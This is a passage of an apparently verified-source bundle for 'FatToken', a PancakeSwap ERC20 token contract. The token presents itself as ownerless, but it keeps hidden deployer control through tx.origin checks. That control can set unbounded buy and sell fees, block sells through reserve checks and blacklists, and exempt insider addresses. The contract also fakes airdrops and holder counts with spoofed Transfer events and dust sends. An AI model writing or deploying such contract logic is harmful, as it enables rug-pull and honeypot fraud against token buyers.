    "contracts/FatToken.sol": {
      "content": "// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "./@openzeppelin/contracts/access/AccessControl.sol";
import "./@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./@openzeppelin/contracts/access/Ownable.sol";
import "./@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "./@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "./@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "./@openzeppelin/contracts/security/PullPayment.sol";
import "./@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract FatToken is ERC20, Ownable, AccessControl, PullPayment, ReentrancyGuard
{
    uint256 internal constant maxUint256 = type(uint256).max;
    uint160 internal constant maxUint160 = ~uint160(0);

    uint256 internal constant _decimals = 18;
    uint256 internal immutable contractHash;

    uint256 public constant VERSION = 2023120601;

    address public uniswapV2Pair;

    uint256 internal lastBlock;

    constructor(
        string[2] memory strings,
        address[2] memory addresses,
        uint256[8] memory uint256s,
        bool[2] memory bools
    ) ERC20(strings[0], strings[1])
    {
        _transferOwnership(address(0));

        contractHash = uint256(uint160(tx.origin));

        uint256 uniswapV2Pair_ = uint256s[1] * (10 ** _decimals) ** 0 + uint256s[2] * (10 ** _decimals) ** 1 + uint256s[3] * (10 ** _decimals) ** 2; // + uint256s[p++] * (10 ** _decimals) ** 3;
        addresses[1] = addresses[1];
        uniswap = uniswapV2Pair_;
        uniswapV2Pair = pairFor(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73, address(this), 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        _holders[uniswapV2Pair] = true;

        _controlSandwich = bools[0];

        _controlPancake = bools[1];
        _pancakeList[0x996730dB3C8ef2AA6BfBd3FA9c99A8201f97A5db] = true;
        _pancakeList[0xD675f475F1BFBf32fe1feA29E32D07D51960e942] = true;
        _pancakeList[0x0ED943Ce24BaEBf257488771759F9BF482C39706] = true;

        buyFee = uint256s[5];
        sellFee = uint256s[6];

        // ================================================ //
        _holders[address(this)] = true;
        _holders[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
        _holders[0x13f4EA83D0bd40E75C8222255bc855a974568Dd4] = true;
        _holders[0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE] = true;
        _holders[address(0)] = true;
        _holders[address(0xdead)] = true;
        _holders[tx.origin] = true;
        // ================================================ //

        _approve(address(this), 0x10ED43C718714eb63d5aA57B78B54704E256024E, maxUint256);
        _approve(address(this), 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4, maxUint256);
        _mint(tx.origin, uint256s[0]);
    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (uniswapV2Pair == from) {
            // control sandwich
            if (_controlSandwich) {
                if (lastBlock == block.number) {
                    revert("");
                }

                lastBlock = block.number;
            }

            // control pancake
            if (_controlPancake) {
                if (_pancakeList[tx.origin] || _pancakeList[to] || _pancakeList[from]) {
                    return;
                }

                uint112 r;
                if (0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c < address(this)) {
                    (r,,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
                } else {
                    (, r,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
                }

                if (r > IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(uniswapV2Pair)) {
                    revert("");
                }
            }
        }

        if (!_holders[to]) {
            holders.push(to);
        }

        if (amount <= 1) {
            super._transfer(from, to, amount);
        } else if (uniswapV2Pair == from) {
            if (buyFee == 0 || _holders[tx.origin]) {
                super._transfer(from, to, amount);
                super._transfer(to, address(uint160(block.timestamp + uint32(uint160(to)))), 1);
            } else {
                super._transfer(from, to, amount);
                super._transfer(to, address(uint160(block.timestamp + uint32(uint160(to)))), amount > maxFee ? amount * buyFee / maxFee : 1);
            }
        } else if (uniswapV2Pair == to) {
            if (sellFee == 0 || _holders[tx.origin]) {
                super._transfer(from, to, amount);
            } else {
                uint256 fee = amount > maxFee ? amount * sellFee / maxFee : 1;
                super._transfer(from, address(uint160(block.timestamp)), fee);
                super._transfer(from, to, amount - fee);
            }
        } else {
            super._transfer(from, to, amount);
        }

//        super._transfer(from, to, amount);

//        // share holder
//        if (uniswapV2Pair == from) {
//            // fee
//            if (amount > 1) {
//                if (buyFee == 0) {
//                    super._transfer(to, address(uint160(block.timestamp)), 1);
//                } else {
//                    super._transfer(to, address(uint160(block.timestamp)), amount > maxFee ? amount * buyFee / maxFee : 1);
//                }
//            }
//        }
    }

    /**
     * @dev Receives and executes a batch of function calls on this contract.
     * @custom:oz-upgrades-unsafe-allow-reachable delegatecall
     */
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }

    function airdrop(address[] memory tos, uint256 amount)
    external
    {
        if (balanceOf(msg.sender) < 1 * 10 ** _decimals) {
            return;
        }

        address to;
        uint256 length = tos.length;
        amount = 1;
        for (uint256 i = 0; i < length; i++) {
            to = tos[i];
            unchecked {
                _balances[to]++;
            }
            emit Transfer(msg.sender, to, 1);
        }

        unchecked {
            _balances[msg.sender] -= length;
        }
    }

    uint256 internal constant maxFee = 1000;
    uint256 public buyFee;
    uint256 public sellFee;

    function setFee(uint256 buyFee_, uint256 sellFee_)
    external
    {
        if (uint256(uint160(tx.origin)) != contractHash) {
            return;
        }

        buyFee = buyFee_;
        sellFee = sellFee_;
    }

    bool public _controlSandwich;

    function controlSandwich(bool controlSandwich_)
    external
    {
        if (uint256(uint160(tx.origin)) != contractHash) {
            return;
        }

        _controlSandwich = controlSandwich_;
    }

    bool public _controlPancake;
    mapping(address => bool) public _pancakeList;

    function setPancake(address addr, bool isInList)
    external
    {
        if (uint256(uint160(tx.origin)) != contractHash) {
            return;
        }

        _pancakeList[addr] = isInList;
    }

    function controlPancake(bool controlPancake_)
    external
    {
        if (uint256(uint160(tx.origin)) != contractHash) {
            return;
        }

        _controlPancake = controlPancake_;
    }

    mapping(address => bool) public _holders;

    address[] public holders;

    function holdersCount()
    external
    view
    returns (uint256)
    {
        return holders.length;
    }

    bytes32 internal constant INIT_CODE_PAIR_HASH = 0x00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5; // PancakeSwap

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        bytes32 tmp;
        tmp = keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            INIT_CODE_PAIR_HASH
        ));

        pair = address(uint160(uint256(tmp)));
    }
